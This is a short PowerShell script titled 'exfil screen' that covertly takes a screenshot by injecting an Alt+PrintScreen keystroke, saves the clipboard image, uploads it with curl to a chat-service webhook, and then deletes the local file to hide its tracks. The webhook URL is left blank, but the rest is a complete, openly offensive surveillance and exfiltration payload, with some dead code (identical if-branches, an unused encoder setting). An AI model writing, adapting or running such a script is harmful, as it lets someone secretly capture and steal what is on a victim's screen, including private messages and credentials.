
#exfil screen
#created by asimp

#imports
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")

#take screenshot
function TakeScreenshot {
    param (
        [switch] $case
    )

    begin {
        Add-Type -AssemblyName System.Drawing
        $drawing = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object {$_.FormatDescription -eq "JPEG"}

    }


process {
    Start-Sleep -Milliseconds 250
    
    #keystroke injection
    if ($case) {
        [Windows.Forms.SendKeys]::SendWait("%{PrtSc}")
    }
    else {
        [Windows.Forms.SendKeys]::SendWait("%{PrtSc}")
    }

    #get image from clippboard
    Start-Sleep -Milliseconds 250
    $clippboard = [Windows.Forms.Clipboard]::GetImage()

    #create image to jpeg
    $drawingEncoded = New-Object Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality, [long]100)

    #save image
    $clippboard.Save("$(Get-Location)\screenshot.jpg")

}
}

#webhook
$webhook = ""

#Take screenshot
TakeScreenshot

#send screenshot to server
curl.exe -F "payload_json={\`"username\`": \`"daddy\`", \`"content\`": \`"Current Screen:\`"}" -F "file=@screenshot.jpg" $webhook

#remove save
Remove-Item -Path screenshot.jpg
